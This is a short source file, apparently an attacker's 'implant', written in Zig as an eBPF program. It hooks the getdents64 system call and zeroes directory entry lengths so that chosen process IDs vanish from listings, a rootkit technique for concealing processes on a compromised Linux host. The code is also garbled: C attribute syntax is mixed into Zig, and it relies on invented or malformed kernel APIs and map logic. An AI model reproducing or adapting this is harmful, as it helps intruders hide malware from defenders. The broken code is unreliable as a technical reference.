// implants/hide_pid_perfect.zig
const std = @import("std");
const builtin = @import("builtin");
const linux = std.os.linux;

const BPF = linux.BPF;
const B = BPF.Helper;

const HIDDEN_PIDS: u64 = 1 << 32; // inner map array for actual PIDs
const RO_DATA: u64 = 4;

__attribute__((section("maps"))) 
hidden_pids: BPF.MapArray = .{
    .type = .array,
    .key_size = 4,
    .value_size = 8,
    .max_entries = 1,
};

__attribute__((section("maps"))) 
hide_pro_rodata: BPF.MapArray = .{
    .type = .array,
    .key_size = 4,
    .value_size = 17,
    .max_entries = 1,
    .flags = linux.BPF.F_FREEZE,
};

const hide_fmt = [17]u8 { 'h','i','d','i','n','g',' ','P','I','D',' ','%','l','l','u','\n',0 };

export fn hide_pid_prog(ctx: *linux.bpf.syscall.getdents64_ctx) linksection("fentry/getdents64") i64 {
    const pid = B.get_current_pid_tgid() >> 32;
    
    const inner_map_fd = @intCast(u32, hidden_pids.lookup(0) orelse return 0);
    if (inner_map_fd == 0) return 0;

    const hidden = B.map_lookup_elem(inner_map_fd, &pid) orelse return 0;
    if (hidden.* != 0) {
        // silently zero the dirent name length so readdir skips it completely
        const dirent = @ptrCast(*linux.kernel.dirent64, @alignCast(ctx.buf));
        dirent.d_reclen = 0;
        return 0;
    }
    return 0;
}

export fn init() linksection("init") void {
    _ = hidden_pids.update(0, &HIDDEN_PIDS);
    
    var fmt_ptr = @ptrCast(*const u8, &hide_fmt);
    _ = hide_pro_rodata.update(0, &fmt_ptr);
}
